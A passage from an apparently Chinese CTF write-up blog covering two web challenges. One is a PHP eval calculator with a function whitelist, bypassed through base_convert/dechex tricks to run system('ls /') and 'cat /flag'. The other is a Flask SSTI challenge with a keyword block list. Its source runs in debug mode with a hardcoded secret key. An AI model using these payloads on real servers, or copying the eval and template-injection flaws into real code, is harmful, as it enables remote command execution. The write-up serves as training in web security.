class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">//帮你算出答案</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-none"><code class="language-none">base_convert(37907361743, 10, 36)base_convert 是 PHP 中的一个函数，其作用是将一个数字从一种进制转换为另一种进制。这里 base_convert(37907361743, 10, 36) 表示把十进制数 37907361743 转换为 36 进制的数，最终得到 "hex2bin"。在 36 进制里，使用的字符集是 0 - 9 和 a - z。2. dechex(1598506324)dechex 函数的功能是把十进制数转换为十六进制数。dechex(1598506324) 会将十进制数 1598506324 转换为十六进制，结果是 "5f474554"。3. $pi = hex2bin("5f474554")hex2bin 函数的作用是把十六进制字符串转换为二进制字符串。hex2bin("5f474554") 会将十六进制字符串 "5f474554" 转换为对应的二进制字符串，实际上得到的是 "_GET"，然后将其赋值给变量 $pi。4. ($$pi){pi}(($$pi){abs})在 PHP 中，$$ 是可变变量的语法。可变变量允许你动态地设置和使用变量名。因为 $pi 的值是 "_GET"，所以 $$pi 就等同于 $_GET。{} 在某些情况下可以替代 [] 来访问数组元素。所以 ($$pi){pi} 就相当于 $_GET['pi']，($$pi){abs} 相当于 $_GET['abs']。整体 ($$pi){pi}(($$pi){abs}) 实际上就是执行 $_GET['pi']($_GET['abs'])，也就是调用通过 GET 请求传递进来的 pi 参数所代表的函数，并且将 GET 请求传递进来的 abs 参数作为该函数的参数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-none"><code class="language-none">hex2bin("5f474554")=&gt;base_convert(37907361743, 10, 36)(dechex(1598506324))=$pisystem("ls /")=&gt;($$pi){tan}(($$pi){sin})?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){sin})&amp;pi=system&amp;sin=ls /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){sin})&amp;pi=system&amp;sin=cat /flagflag{d0162c99-47e5-4483-9828-1feeae7b7fc6}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4efde3cec38bc6320055270b9552902a.png"></p><p><a href="https://blog.csdn.net/qq_35782055/article/details/129126825">关于ctf中flask算pin总结_ctf:flask-CSDN博客</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1feb6d1e2469a6a3171a1f004e7e524f.png"></p><pre class="line-numbers language-none"><code class="language-none">{{7*7}}-&gt;no{{7+7}}-&gt;14试了试，popen，*不能open('/etc/passwd/')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给chef美化一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> SubmitField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> DataRequired<span class="token keyword">from</span> flask_bootstrap <span class="token keyword">import</span> Bootstrap<span class="token keyword">import</span> base64app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s_e_c_r_e_t_k_e_y'</span>bootstrap <span class="token operator">=</span> Bootstrap<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">NameForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    text <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'BASE64加密'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'提交'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">NameForm1</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    text <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'BASE64解密'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'提交'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>str_val<span class="token punctuation">)</span><span class="token punctuation">:</span>    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"popen"</span><span class="token punctuation">,</span> <span class="token string">"import"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">,</span> <span class="token string">"subprocess"</span><span class="token punctuation">,</span> <span class="token string">"commands"</span><span class="token punctuation">,</span> <span class="token string">"socket"</span><span class="token punctuation">,</span>                  <span class="token string">"hex"</span><span class="token punctuation">,</span> <span class="token string">"base64"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> x <span class="token keyword">in</span> str_val<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hint'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    txt <span class="token operator">=</span> <span class="token string">"失败乃成功之母！！"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"hint.html"</span><span class="token punctuation">,</span> txt<span class="token operator">=</span>txt<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>        text_encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"结果 :</span><span class="token interpolation"><span class="token punctuation">{</span>text_encoded<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>        flash<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'encode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        form <span class="token operator">=</span> NameForm<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"加密"</span><span class="token punctuation">,</span> img<span class="token operator">=</span><span class="token string">"flask.png"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            text_decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"结果 ： </span><span class="token interpolation"><span class="token punctuation">{</span>text_decoded<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>            <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>        <span class="token keyword">except</span> base64<span class="token punctuation">.</span>binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"输入的不是有效的 Base64 编码字符串"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        form <span class="token operator">=</span> NameForm1<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"解密"</span><span class="token punctuation">,</span> img<span class="token operator">=</span><span class="token string">"flask1.png"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/&lt;name&gt;'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">not_found</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"404.html"</span><span class="token punctuation">,</span> name<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
